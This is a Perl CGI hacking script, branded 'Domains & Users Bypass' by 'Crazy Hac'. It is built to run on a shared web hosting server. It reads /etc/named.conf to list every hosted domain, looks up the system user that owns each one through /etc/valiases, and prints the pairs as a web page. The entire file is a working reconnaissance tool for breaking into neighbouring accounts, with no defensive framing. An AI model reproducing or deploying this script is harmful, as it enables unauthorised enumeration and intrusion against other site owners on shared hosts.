#!/usr/bin/perl -I/usr/local/bandmin
print "Content-type: text/html\n\n";
print'<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>C0ded By Dr.ahmed</title>
<style type="text/css">
.newStyle1 {
 background-color: #000000;
 font-family: "Courier New", Courier, monospace;
 font-size: large;
 font-weight: bold;
 color: #FFFFFF;
}
.style1 {
 text-align: center;
}
</style>
</head>

<body class="newStyle1">

<p class="style1">Domains &amp; Users </p>
<p class="style1">Bypass</p>
<p class="style1">By Crazy Hac </p>
<p class="style1">Email:CraZy.HaC@HoTmAil.Com </p>
';
open (d0mains, '/etc/named.conf') or $err=1;
@kr = <d0mains>;
close d0mains;
if ($err){
print ('<p class="style1">&nbsp;</p><p class="style1">C0uldn\'t Bypass it , Sorry</p>');
die();
}else{
print '<p class="style1">&nbsp;</p>
<p class="style1">Here is All Domains &amp; Users :</p>
';}
foreach my $one (@kr)
{
if($one =~ m/.*?zone "(.*?)" {/){
$filename= "/etc/valiases/".$1;
$owner = getpwuid((stat($filename))[4]);
print '<p class="style1">'.$1.' : '.$owner.'</p>
';
}
}
print'</body></html>';
